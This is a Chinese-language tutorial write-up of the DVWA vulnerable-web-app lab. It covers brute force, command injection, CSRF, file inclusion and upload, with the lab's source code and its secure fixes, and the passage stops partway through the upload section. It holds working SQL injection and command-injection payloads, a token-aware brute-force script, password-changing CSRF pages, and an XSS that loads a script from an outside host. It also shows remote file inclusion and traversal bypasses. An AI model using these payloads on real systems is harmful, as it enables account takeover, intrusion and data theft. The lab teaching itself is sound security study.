# DVWA 入门靶场学习记录



# 部署安装

安装的这个过程很没有意义，所以这里直接去 Dokcer Hub 随缘搜索一个容器来部署安装：

```bash
# 拉取镜像
docker pull sqreen/dvwa

# 部署安装
docker run -d -t -p 8888:80 sqreen/dvwa
```

然后本地浏览器访问 `http://127.0.0.1:8888`，我们首先需要初始化一下 DVWA，相关的版本信息如下:

```bash
# MySQL root 用户密码为空
$ mysql -e "select version(),user()"
+---------------------------+----------------+
| version()                 | user()         |
+---------------------------+----------------+
| 10.3.22-MariaDB-0+deb10u1 | root@localhost |
+---------------------------+----------------+

# PHP 7.3.14 版本
$ php -v
PHP 7.3.14-1~deb10u1 (cli) (built: Feb 16 2020 15:07:23) ( NTS )
Copyright (c) 1997-2018 The PHP Group
Zend Engine v3.3.14, Copyright (c) 1998-2018 Zend Technologies
    with Zend OPcache v7.3.14-1~deb10u1, Copyright (c) 1999-2018, by Zend Technologies

# Apache 版本为 2.4.38 
$ apache2 -v
Server version: Apache/2.4.38 (Debian)
Server built:   2019-10-15T19:53:42

# 内核版本
$ uname -a
Linux 57bb72d1c052 4.19.76-linuxkit #1 SMP Fri Apr 3 15:53:26 UTC 2020 x86_64 GNU/Linux
```

# Brute Force 暴力破解

在 Web 安全领域暴力破解是一个基础技能，不仅需要好的字典，还需要具有灵活编写脚本的能力。

## Low

**源码**：

```php
if( isset( $_GET[ 'Login' ] ) ) {
    # 获取用户名和密码
    $user = $_GET[ 'username' ];
    $pass = $_GET[ 'password' ];
    $pass = md5( $pass );

    # 查询验证用户名和密码
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );

    if( $result && mysql_num_rows( $result ) == 1 ) {
      # 输出头像和用户名
      $avatar = mysql_result( $result, 0, "avatar" );
      echo "<p>Welcome to the password protected area {$user}</p>";
    }
    else {
        登录失败
    }
    mysql_close();
}
```

源码中暴露的问题如下：

1. GET 登录不够安全，一般使用 POST 方式进行登录
2. 用户名和密码都没有进行过滤

这一关是考察爆破的，所以不需要花里胡哨的测试 SQL 注入之类的漏洞了，爆破的话可以自己写 Python 脚本也可以直接使用 Burpsuite 进行爆破，因为这个属于基本功，国光我这里写的话就有点浪费时间了，溜了溜了。

赶紧跑了回来，做到 Medium 发现依然可以爆破，只是增加了 SQL 过滤函数？？？ 那难道这一题暗示我们进行 SQL 注入吗？黑人问号？？？ 既然这样那就顺便给这题注入了吧。

### 万能密码

payload

```payload
?username=admin'--+&password=111&Login=Login#
```

### 联合查询

并不可以，因为代码中没有输出查询信息，联合注入的话 tan90°

### 报错注入

mysql_error() 表明可以进行报错注入，直接丢 payload 吧:

payload

```payload
?username=admin'+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(user,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+&password=111&Login=Login#
```

### 盲注

布尔和延时盲注这里当然也是可以的，但是手工注入的效率太低了，这里就不再演示了，感兴趣朋友可以自己私下尝试看看。

## Medium

**源码**：

```php
// 对用户名和密码进行了过滤
$user = $_GET[ 'username' ];
$user = mysql_real_escape_string( $user );
$pass = $_GET[ 'password' ];
$pass = mysql_real_escape_string( $pass );
$pass = md5( $pass );

// 验证用户名和密码
$query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";

if( $result && mysql_num_rows( $result ) == 1 ) {
    登录成功
}
else {
  sleep( 2 );
    登录失败
}
```

这个 Medium 级别的源码登录逻辑并没有啥变化，只是登录失败的时候会延时 2 秒，这样爆破的速度会慢一些，不过依然可以进行传统的暴力破解。

另外本关的用户名和密码被 mysql_real_escape_string 函数过滤了一下再带入 SQL 语句中，这个函数会在 `'`,`"`和`\`前面添加反斜杠`\`来转义危险字符。是不是这样就没戏了呢？是的，这一题真的没戏了 国光我尝试了 `%df`宽字节没有绕过，一般宽字节可以绕过是因为数据库编码转换的问题造成的，这一题居然没有，难以置信。

## High

**源码**：

```php
// 检测用户的 token
checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

// 过滤用户名和密码
$user = $checkToken_GET[ 'username' ];
$user = stripslashes( $user );
$user = mysql_real_escape_string( $user );
$pass = $_GET[ 'password' ];
$pass = stripslashes( $pass );
$pass = mysql_real_escape_string( $pass );
$pass = md5( $pass );

// 数据匹配
$query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
$result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );

if( $result && mysql_num_rows( $result ) == 1 ) {
  登录成功
}
else {
  sleep( rand( 0, 3 ) );
  登录失败
}
```

这一关增加了 token 的检测，从如下代码：

```php
checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
```

Token 的值来源于 index.php，访问 index.php 查看源码信息，找到如下 token 的位置：

```php
require_once DVWA_WEB_PAGE_TO_ROOT . 'dvwa/includes/dvwaPage.inc.php';
```

追踪 dvwaPage.inc.php 找到 token 相关函数的定义：

```php
function checkToken( $user_token, $session_token, $returnURL ) {  # 校验 token
    if( $user_token !== $session_token || !isset( $session_token ) ) {
        dvwaMessagePush( 'CSRF token is incorrect' );
        dvwaRedirect( $returnURL );
    }
}

function generateSessionToken() {  # 当前时间的 md5 值作为 token
    if( isset( $_SESSION[ 'session_token' ] ) ) {
        destroySessionToken();
    }
    $_SESSION[ 'session_token' ] = md5( uniqid() );
}

function destroySessionToken() {  # 销毁 token
    unset( $_SESSION[ 'session_token' ] );
}

function tokenField() {  # 将 token 输出到 input 框中
    return "<input type='hidden' name='user_token' value='{$_SESSION[ 'session_token' ]}' />";
}
```

然后登陆的数据包如下：

```http
GET /vulnerabilities/brute/index.php?username=admin&password=password&Login=Login&user_token={token} HTTP/1.1
```

需要在 user_token 的后面跟上之前从源码中获取到的 token 值，这是一个登陆的完整流程，下面分别尝试使用 Python 脚本 和 Burpsuite 来演示一下这个爆破。

### Python

```python
import os
import re
import sys
import requests

def get_token(headers):
    index_url = 'http://127.0.0.1:8888/vulnerabilities/brute/index.php'
    index_html = requests.get(url=index_url, headers=headers, timeout=3).text
    token_pattern = re.compile(r"name='user_token' value='(.*?)'")
    token = token_pattern.findall(index_html)[0]
    return token

def brute_with_token(uname, passwd, headers):
    token = get_token(headers)
    brute_url = f'http://127.0.0.1:8888/vulnerabilities/brute/index.php?username={uname}&password={passwd}&Login=Login&user_token={token}'
    r = requests.get(url=brute_url, headers=headers)
    print(f'{token}:{uname}:{passwd}', end='\n')

    if 'hackable' in r.text:
        print('\nBingo 爆破成功')
        print(f'username:{uname} \npassword:{passwd}\n')
        os._exit(0)

if __name__ == '__main__':
    headers = {
        'Host': '127.0.0.1:8888',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:56.0) Gecko/20100101 Firefox/56.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding': 'gzip, deflate',
        'Cookie': 'csrftoken=zeS7KCvlVoiNMuxtdrjF77dC88sqib2J2nYf4alfeDwKeaSaEMDA5wFIH9yf8kyz; PHPSESSID=bqfflff6be4tgg69lfnv4g4ik4; security=high'
    }

    username = sys.argv[1]
    password_path = sys.argv[2]

    try:
        with open(password_path, "r") as f:
            lines = ''.join(f.readlines()).split("\n")

        for password in lines:
            brute_with_token(username, password, headers)
    except Exception as e:
        print('文件读取异常')
```

Python 这里面因为涉及到先获取 token 然后再用 token 带入爆破的问题，国光我尝试了进程池异步发现执行顺序这一块不好处理，于是放弃了，还是老老实实使用单线程来爆破了。

脚本使用方法和效果：

```bash
$ python brute.py admin pass.txt

7e43d35b6c656afdf926a95a55d6252e:admin:Pass999
...
f6f9db1ba43dfd57288fb73159503652:admin:password

Bingo 爆破成功
username:admin 
password:password
```

### Burpsuite

首先截取到登录的数据包，然后发送到测试器中，然后攻击类型选择 「Pitchfork」，然后根据实际情况标记变量：

![img](https://image.3001.net/images/20200522/15901408054564.png)



> 吐槽一下网上不少人写的文章这里用的是 Cluster bomb 模式去爆破，然后还说爆破效率低 我也是醉了，接着后面的人学习模仿操作 一代又一代的误导下去，关于 Cluster bomb 的爆破 建议大家自己去观测下 Burpsuite 的爆破 Payload 然后就明白为啥不用这种方式了

因为本关涉及到 302 重定向，所以首先得在测试器中勾选「总是」重定向才可以：



![img](https://image.3001.net/images/20200713/15946474687258.png)

**img**



然后「有效载荷」设置负载集 1 为自己的密码字典，负载集 2 选择 「递归搜索」：



![img](https://image.3001.net/images/20200522/15901411265603.png)



接着到「选项」里面将线程数调整为 1 ，因为这种灵活的爆破方法不支持多线程：



![img](https://image.3001.net/images/20200522/15901401285766.png)



> 国光这里说不支持多线程，作为网络安全从业者的我们应该要有叛逆的性格，实际上你也可以尝试看看不使用单线程看看会提示弹出啥信息。

然后到往下翻，找到 「Grep - Extract」添加一个 Grep 查询筛选， 接着点击获取返回包值，然后鼠标选择要提取的 token，此时 Burpsuite 会自动生成对应的匹配规则：



![img](https://image.3001.net/images/20200629/15933933861251.png)



Amazing ，简直是正则表达式小菜鸡的福利，实际上正则表达式也没有那么复杂，网上可以搜索 《正则表达式 30 分钟入门》这本开源的 PDF 书籍，很快就会上手的。最终的爆破效果如下：



![img](https://image.3001.net/images/20200522/15901597596899.png)



## Impossible

下面来理一下 Impossible 级别的代码：

```php
// 检验 token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // 过滤 username 和 password
    $user = $_POST[ 'username' ];
    $user = stripslashes( $user );
    $user = mysql_real_escape_string( $user );
    $pass = $_POST[ 'password' ];
    $pass = stripslashes( $pass );
    $pass = mysql_real_escape_string( $pass );
    $pass = md5( $pass );

    // 失败登录次数 3 锁定时间单位 15 账户锁定
    $total_failed_login = 3;
    $lockout_time       = 15;
    $account_locked     = false;

    // 验证用户名和密码
    $data = $db->prepare( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' );
    $data->bindParam( ':user', $user, PDO::PARAM_STR );
    $data->execute();
    $row = $data->fetch();

    // 检查用户是否已被锁定.
    if( ( $data->rowCount() == 1 ) && ( $row[ 'failed_login' ] >= $total_failed_login ) )  {

        // 登录失败超过 3 次 15 分钟再尝试
        $last_login = $row[ 'last_login' ];
        $last_login = strtotime( $last_login );
        $timeout    = strtotime( "{$last_login} +{$lockout_time} minutes" );
        $timenow    = strtotime( "now" );

        // 检查是否已经过了足够的时间，是否没有锁定帐户
        if( $timenow > $timeout )
            $account_locked = true;
    }

    // 检验用户名和密码
    $data = $db->prepare( 'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
    $data->bindParam( ':user', $user, PDO::PARAM_STR);
    $data->bindParam( ':password', $pass, PDO::PARAM_STR );
    $data->execute();
    $row = $data->fetch();

    // 如果登录有效
    if( ( $data->rowCount() == 1 ) && ( $account_locked == false ) ) {
        // 获取用户头像、登录测试、和最近登录
        $avatar       = $row[ 'avatar' ];
        $failed_login = $row[ 'failed_login' ];
        $last_login   = $row[ 'last_login' ];

        // 输出登录成功信息
        echo "<p>Welcome to the password protected area <em>{$user}</em></p>";
        echo "<img src=\"{$avatar}\" />";

        // 自上次登录后帐户是否已被锁定？
        if( $failed_login >= $total_failed_login ) {
            echo "<p><em>Warning</em>: Someone might of been brute forcing your account.</p>";
            echo "<p>Number of login attempts: <em>{$failed_login}</em>.<br />Last login attempt was at: <em>${last_login}</em>.</p>";
        }

        // 重置登录失败次数
        $data = $db->prepare( 'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;' );
        $data->bindParam( ':user', $user, PDO::PARAM_STR );
        $data->execute();
    }
    else {
        // 登录失败随机延时并输出返回信息
        sleep( rand( 2, 4 ) );
        echo "<pre><br />Username and/or password incorrect.<br /><br/>Alternative, the account has been locked because of too many failed logins.<br />If this is the case, <em>please try again in {$lockout_time} minutes</em>.</pre>";

        // 更新登录失败数
        $data = $db->prepare( 'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;' );
        $data->bindParam( ':user', $user, PDO::PARAM_STR );
        $data->execute();
    }

    // 设置最后的登录时间
    $data = $db->prepare( 'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;' );
    $data->bindParam( ':user', $user, PDO::PARAM_STR );
    $data->execute();
```

这里登录方式从 GET 方式转变成了 POST 方式了，不仅和 high 级别那样需要验证 token，而且还设置的登录失败的次数，如果登录失败超过 3 次，那么账户被锁定，只有 15 分钟可以再进行尝试，有点变态啊！！！ 爆破党的克星，祝好！

# Command Injection 命令注入

用户可以执行恶意代码语句，在实战中危害比较高，也称作命令执行，一般属于高危漏洞。

## Low

```php
// 获取 ip
$target = $_REQUEST[ 'ip' ];

// 判断操作系统来细化 ping 命令
if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
  // Windows
  $cmd = shell_exec( 'ping  ' . $target );
}
else {
  // *nix 需要手动指定 ping 命令的次数
  $cmd = shell_exec( 'ping  -c 4 ' . $target );
}

// 输出命令执行的结果
echo "<pre>{$cmd}</pre>"; 
```

Low 级别这里直接将 target 变量给带入到 shell_exec 命令执行的函数里面了，这样是及其危险的，可以使用使用如下命令连接符号来拼接自己的命令：

| 符号   | 说明                                                         |
| :----- | :----------------------------------------------------------- |
| A;B    | A 不论正确与否都会执行 B 命令                                |
| A&B    | A 后台运行，A 和 B 同时执行                                  |
| A&&B   | A 执行成功时候才会执行 B 命令                                |
| A\|B   | A 执行的输出结果，作为 B 命令的参数，A 不论正确与否都会执行 B 命令 |
| A\|\|B | A 执行失败后才会执行 B 命令                                  |

所以这一个基础关卡我们可以尝试输入如下 Payload：

```bash
127.0.0.1 ; cat /etc/passwd
127.0.0.1 & cat /etc/passwd
127.0.0.1 && cat /etc/passwd
127.0.0.1 | cat /etc/passwd
233 || cat /etc/passwd
```



![img](https://image.3001.net/images/20200523/15902049347014.png)



## Medium

直接看关键部分的代码吧：

```php
$substitutions = array(
  '&&' => '',
  ';'  => '',
); 

// 移除黑名单字符
$target = str_replace( array_keys( $substitutions ), $substitutions, $target );
```

可以看到这里黑名单只过滤了两种情况，实际上依然还可使用如下 Payload：

```bash
127.0.0.1 & cat /etc/passwd
127.0.0.1 | cat /etc/passwd
233 || cat /etc/passwd
```

## High

首先来看下 High 级别的过滤代码：

```php
$substitutions = array(
        '&'  => '',
        ';'  => '',
        '| ' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
    );
```

这里乍一看敏感字符都被过滤了，这里实际上是考擦眼力的地方：

```php
'| ' => '',
```

没错这个管道符是 | 是带空格的，所以这里我们不使用空格的话依然可以绕过：

```bash
127.0.0.1 |cat /etc/passwd
127.0.0.1|cat /etc/passwd
```

## Impossible

下面来看一下 Impossible 的代码，学习一下安全的过滤方式：

```php
# 以 . 作分隔符 分隔 $target
$octet = explode( ".", $target );

// 检测分隔后的元素是否都是数字类型
if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) {
  // 如果都是数字类型的话 还原 $target
  $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];
else {
  // 否则提示输出无效
  $html .= '<pre>ERROR: You have entered an invalid IP.</pre>';
}
```

这种过滤方式类似于 白名单 的过滤方式了，白名单的话 相比 黑名单来说还是比较实用方便的。

# CSRF 跨站请求伪造

CSRF 简单概括起来就是借刀杀人，这里的”刀“就是要攻击用户的认证会话信息，”杀人“指的是敏感操作。

## Low

源码简单分析：

```php
$pass_new  = $_GET[ 'password_new' ];
$pass_conf = $_GET[ 'password_conf' ];

if( $pass_new == $pass_conf ):
    $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" .     dvwaCurrentUser() . "';";
```

源码中可以是 GET 方式获取密码，两次输入密码一致的话，然后直接带入带数据中修改密码。这种属于最基础的 GET 型 CSRF，只需要攻击者让用户访问如下网址：

```paylaod
http://127.0.0.1:8888/vulnerabilities/csrf/?password_new=111&password_conf=111&Change=Change#
```

受害者点击这个网址的话就会把密码修改为 111 当然受害者加入智商在线的话，是不会轻易点击这个奇怪的链接的，这个时候可以尝试如下方法：

1. **短网址**

百度或者谷歌一下可以找到一大堆在线短网址生成工具，这里国光使用站长工具的[短链在线生成](https://tool.chinaz.com/tools/dwz.aspx)，然后上面那个奇怪的网址短网址后的效果如下：

```none
http://suo.im/5LkFdh
```

这个时候受害者访问这个短网址的话就会重定向到之前那个修改密码的链接，防不胜防啊：



![img](https://image.3001.net/images/20200526/15904788968136.png)



使用 curl -i 可以轻松查看重定向信息

1. **配合 XSS**

这种 XSS 和 CSRF 结合成功率很高，攻击更加隐蔽。

首先新建一个带有 xss 攻击语句的 html 页面，内容如下：

```html
<html>
<head>
    <title>XSS&CSRF</title>
</head>
<body>
<script src="http://127.0.0.1:8888/vulnerabilities/csrf/?password_new=222&password_conf=222&Change=Change#"></script>
</body>
</html>
```

然后受害者访问 `http://127.0.0.1/xss.html` 这个页面的时候，密码就被修改成了 222

核心语句就是通过 `scirpt` 标签的 src 属性来记载攻击 payload 的 URL：

```javascript
<script src="http://127.0.0.1:8888/vulnerabilities/csrf/?password_new=222&password_conf=222&Change=Change#"></script>
```

类似的还可以使用如下标签：

`iframe` 标签使用的话记得添加 `style="display:none;"`，这样可以让攻击更加隐蔽

```html
<iframe src="http://127.0.0.1:8888/vulnerabilities/csrf/?password_new=222&password_conf=222&Change=Change#" style="display:none;"></iframe>
```

`img` 标签的 src 属性依然也可以实现攻击：





html

```html
<img src="http://127.0.0.1:8888/vulnerabilities/csrf/?password_new=222&password_conf=222&Change=Change#">
```

到这里大家应该发现规律了吧，就是 src 属性拥有跨域的能力，只要标签支持 src 的话 都可以尝试一下 xss 与 csrf 结合。

## Medium

中等级别的代码增加了 referer 判断：





php

```php
if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false )
```

如果 HTTP_REFERER 和 SERVER_NAME 不是来自同一个域的话就无法进行到循环内部，执行修改密码的操作。

这个时候需要我们手动伪造 referer 来执行 CSRF 攻击:



![img](https://image.3001.net/images/20200526/1590484054728.png)

**img**



当然受害者肯定不会帮我们手动添加 referer 的，因为代码使用了 `stripos` 函数来检测 referer，所以这个时候我们得精心构造好一个 html 页面表单：





html

```html
<html>
<head>
    <meta charset="utf-8">
    <title>CSRF</title>
</head>
<body>

<form method="get" id="csrf" action="http://127.0.0.1:8888/vulnerabilities/csrf/">
    <input type="hidden" name="password_new" value="222">
    <input type="hidden" name="password_conf" value="222">
    <input type="hidden" name="Change" value="Change">
</form>
<script> document.forms["csrf"].submit(); </script>
</body>
</html>
```

该表单通过：





javascript

```javascript
<script> document.forms["csrf"].submit(); </script>
```

实现自动触发提交 id 为 csrf 的表单，这个在实战中是比较实用的一个技巧。

1. **目录混淆 referer**

将上述 html 页面放到服务器的 `127.0.0.1` 目录下，然后让用户访问自动触发提交然后访问构造好的 payload 地址：





payload

```payload
http://www.sqlsec.com/127.0.0.1/csrf.html
```

1. **文件名混淆 referer**

或者将上述 html 文件重命名为 `127.0.0.1.html`，然后访问如下 payload：





payload

```payload
http://www.sqlsec.com/127.0.0.1.html
```

这里有一个小细节，如果目标网站是 http 的话，那么 csrf 的这个 html 页面也要是 http 协议，如果是 https 协议的话 就会失败，具体自行测试。

1. **? 拼接混淆 referer**





payload

```payload
http://www.sqlsec.com/csrf.html?127.0.0.1
```

因为 ? 后默认当做参数传递，这里因为 html 页面是不能接受参数的，所以随便输入是不影响实际的结果的，利用这个特点来绕过 referer 的检测。

## High

首先来分析一下源码：





 

```bash
# 检测用户的 user_token
checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
```

相对于 Low 级别，实际上就是增加了一个 token 检测，这样我们 CSRF 攻击的时候必须知道用户的 token 才可以成功。

关于 DVWA CSRF High 这里网上的文章也形形色色…

这一关思路是使用 XSS 来获取用户的 token ，然后将 token 放到 CSRF 的请求中。因为 HTML 无法跨域，这里我们尽量使用原生的 JS 发起 HTTP 请求才可以。下面是配合 DVWA DOM XSS High 来解题的。

1. **JS 发起 HTTP CSRF 请求**

首先新建 csrf.js 内容如下：





javascript

```javascript
// 首先访问这个页面 来获取 token
var tokenUrl = 'http://127.0.0.1:8888/vulnerabilities/csrf/';

if(window.XMLHttpRequest) {
    xmlhttp = new XMLHttpRequest();
}else{
    xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
}

var count = 0;
xmlhttp.withCredentials = true;
xmlhttp.onreadystatechange=function(){
    if(xmlhttp.readyState ==4 && xmlhttp.status==200)
    {
          // 使用正则提取 token
        var text = xmlhttp.responseText;
        var regex = /user_token\' value\=\'(.*?)\' \/\>/;
        var match = text.match(regex);
        var token = match[1];
          // 发起 CSRF 请求 将 token 带入
        var new_url = 'http://127.0.0.1:8888/vulnerabilities/csrf/?user_token='+token+'&password_new=111&password_conf=111&Change=Change';
        if(count==0){
            count++;
            xmlhttp.open("GET",new_url,false);
            xmlhttp.send();
        }
    }
};
xmlhttp.open("GET",tokenUrl,false);
xmlhttp.send();
```

将这个 csrf.js 上传到外网的服务器上，国光这里临时放在我的网站根目录下：





payload

```payload
http://www.sqlsec.com/csrf.js
```

然后此时访问 DVWA DOM XSS 的 High 级别，直接发起 XSS 测试（后面 XSS 会详细来讲解）：





javascript

```javascript
http://127.0.0.1:8888/vulnerabilities/xss_d/?default=English&a=</option></select><script src="http://www.sqlsec.com/csrf.js"></script>
```

这里直接通过 script 标签的 src 来引入外部 js，访问之后此时密码就被更改为 111 了

1. **常规思路 HTML 发起 CSRF 请求**

假设攻击者这里可以将 HTML 保存上传到 CORS 的跨域白名单下的话，那么这里也可以通过 HTML 这种组合式的 CSRF 攻击。





html

```html
<script>
  function attack(){
    var token = document.getElementById("get_token").contentWindow.document.getElementsByName('user_token')[0].value
    document.getElementsByName('user_token')[0].value=token;
    alert(token);
    document.getElementById("csrf").submit();
  }
</script>

<iframe src="http://127.0.0.1:8888/vulnerabilities/csrf/" id="get_token" style="display:none;">
</iframe>

<body onload="attack()">
  <form method="GET" id="csrf" action="http://127.0.0.1:8888/vulnerabilities/csrf/">
    <input type="hidden" name="password_new" value="111">
    <input type="hidden" name="password_conf" value="111">
    <input type="hidden" name="user_token" value="">
    <input type="hidden" name="Change" value="Change">
  </form>
</body>
```

将上述文件保存为 csrf.html 然后放入到 CORS 白名单目录下，这在实战中比较少见，这里为了演示效果，国光将这个文件放入到靶场服务器的根目录下，然后直接访问这个页面即可发起 CSRF 攻击：





payload

```payload
http://127.0.0.1:8888/csrf.html
```

## Impossible

下面来看一下 Impossible 的防护方式：





php

```php
# 依然检验用户的 token
checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

# 需要输入当前的密码
$pass_curr = $_GET[ 'password_current' ];
$pass_new  = $_GET[ 'password_new' ];
$pass_conf = $_GET[ 'password_conf' ];

# 检验当前密码是否正确
$data = $db->prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
```

这里相对于 High 级别主要就是增加了输入当前密码的选项，这个在实战中还是一种比较主流的防护方式，攻击者不知道原始密码的情况下是无法发起 CSRF 攻击的，另外常见的防护方法还有加验证码来防护。



![img](https://image.3001.net/images/20200527/1590538798248.png)



# File Inclusion 文件包含

## Low

最原始的文件包含：





php

```php
<?php
$file = $_GET[ 'page' ];

if( isset( $file ) )
    include( $file );
else {
    header( 'Location:?page=include.php' );
    exit;
}
?>
```

page 参数没有任何过滤，然后直接被 include 包含进来，造成文件包含漏洞的产生。

这种情况下有各种各样的攻击方式，因为是 DVWA 靶场的原因，很多种攻击条件都满足，忍不住下面来简单演示一下：

1. **文件读取**





payload

```payload
/fi/?page=/etc/passwd
/fi/?page=../../../../../../../../../etc/passwd
```

1. **远程文件包含**

实际生产环境中基本上很难遇到远程文件包含，因为这里是 DVWA 靶场，所以漏洞比较多。





payload

```payload
/fi/?page=http://www.baidu.com/robots.txt
```

1. **本地文件包含 Getshell**

新建一个 info.txt 内容如下：





php

```php
<?php phpinfo();?>
```

这里借助文件上传模块来上传 txt:



![img](https://image.3001.net/images/20200527/15905397516912.png)



然后尝试直接包含这个 txt 文件:





payload

```payload
/fi/?page=../../hackable/uploads/info.txt
```



![img](https://image.3001.net/images/20200527/15905398205987.png)



1. **远程文件包含 Getshell**

一般来说可以包含远程文件了，我们常用来进行远程文件包含来 getshell，和上面一样 我们将 info.txt 上传到外网的服务器上，国光临时上传到我的网站根目录下：





payload

```payload
https://www.sqlsec.com/info.txt
```

然后尝试直接进行远程文件包含：





payload

```payload
/fi/?page=https://www.sqlsec.com/info.txt
```



![img](https://image.3001.net/images/20200527/15905400568577.png)



1. **伪协议**

- php://filter 文件读取





payload

```payload
/fi/?page=php://filter/read=convert.base64-encode/resource=index.php
/fi/?page=php://filter/convert.base64-encode/resource=index.php
```

此时会拿到 base64 加密的字符串，解密的话就可以拿到 index.php 的源码

- php://input getshell

POST 内容可以直接写 shell ，内容如下：





php

```php
<?php fputs(fopen('info.php','w'),'<?php phpinfo();?>')?>
```



![img](https://image.3001.net/images/20200527/15905405689304.png)



然后会在当前目录下写入一个木马，直接访问看看：





payload

```payload
http://127.0.0.1:8888/vulnerabilities/fi/info.php
```



![img](https://image.3001.net/images/20200527/15905406707600.png)



- data:// 伪协议

数据封装器，和 php:// 相似，可以直接执行任意 PHP 代码：





php

```php
/fi/?page=data:text/plain,<?php phpinfo();?>
/fi/?page=data:text/plain;base64, PD9waHAgcGhwaW5mbygpOz8%2b
```



![img](https://image.3001.net/images/20200527/15905413817484.png)



… 伪协议这块比较多 国光这篇文章说的 DVWA 就不再继续拓展了，感兴趣的朋友可以自己去研究看看

## Medium

看下本关的过滤级别：





php

```php
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\"" ), "", $file );
```

可以看到过滤了 `http://` 和 `https://` 以及 `../` 和 `.."`，这里国光我一直有疑问，网上文章都说过滤了 `..\`，不知道他们尝试了没有，这里代码明显是过滤了 `.."`，不过这样过滤是没有意义的，所以应该是 DVWA 的作者写错了，正确的过滤代码应该这么写：





php

```php
$file = str_replace( array( "../", "..\\ ), "", $file );
```

> 国光我看了网上很多讲解 DVWA 的文章，这里的错误貌似都没有人提到，很奇怪，我不相信大家搞代码审计的，连这种小 BUG 都看不出来

1. **远程文件包含**

先看远程文件包含，过滤了 `http://` 和 `https://`，因为使用的是 str_replace 替换为空，所以这里可以使用常规套路，就是嵌套双写绕过。具体的 payload 如下：





payload

```payload
/fi/?page=hhttps://ttps://www.sqlsec.com/info.txt
```

str_replace 函数处理之后就变成了如下情况：





payload

```payload
/fi/?page=https://www.sqlsec.com/info.txt
```

又因为正则匹配没有不区分大小写，所以这里通过大小写转换也是可以成功绕过：





payload

```payload
/fi/?page=HTTPS://www.sqlsec.com/info.txt
```

1. **本地文件包含**

因为过滤 `../` 和 `..\`，也是使用的是 str_replace 替换为空，所以依然可以尝试双写嵌套绕过：





payload

```payload
/fi/?page=..././..././..././..././..././etc/passwd
```

str_replace 函数处理之后就变成了如下情况：





none

```none
/fi/?page=../../../../../etc/passwd
```

同样如果这里知道绝对路径的话，直接包含绝对路径也是OK的：





none

```none
/fi/?page=/etc/passwd
```

## High

High 级别的过滤规则如下：





php

```php
$file = $_GET[ 'page' ];

if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
    echo "ERROR: File not found!";
    exit;
}
```

代码里面要求 page 参数的开头必须是 file，否则直接就 exit 退出。

这里刚好可以使用 file:// 协议来进行文件读取了：





payload

```payload
/fi/?page=file:///etc/passwd
```

## Impossible

来学习一下 无懈可击的代码过滤规则：





php

```php
$file = $_GET[ 'page' ];

if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {
    echo "ERROR: File not found!";
    exit;
}
```

这里又用了白名单情况，一劳永逸，想输入其他乱七八糟的直接就 exit 退出程序。

# File Upload 文件上传

## Low

直接看代码，就是一个正常的上传代码，没有做任何的过滤措施，上传啥文件都OK，并且也输出了上传路径信息了。

上传一个 phpinfo.php 内容如下：





php

```php
<?php phpinfo();?>
```



![img](https://image.3001.net/images/20200527/15905462108884.png)

**img**



获取到上传路径后直接访问看看：





payload

```payload
http://127.0.0.1:8888/vulnerabilities/upload/../../hackable/uploads/phpinfp.php
```

最后实际上访问的是如下 URL：





payload

```payload
http://127.0.0.1:8888/hackable/uploads/phpinfp.php
```



![img](https://image.3001.net/images/20200527/15905463172738.png)



## Medium

Medium 级别的防护代码如下：





php

```php
// 获取文件名、文件类型、以及文件大小
$uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
$uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
$uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];

// 文件类型 image/jpeg 或者 image/png 且 文件大小小于 100000
if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
   ( $uploaded_size < 100000 ) ) {
```

这里只进行了 Content-Type 类型校验，我们正常上传 php 文件，然后直接将其 文件类型修改为 image/png：



![img](https://image.3001.net/images/20200527/15905469554849.png)

**img**



即可正常上传

## High

High 级别的关键代码如下：





php

```php
// h获取文件名、文件后缀、文件大小
$uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
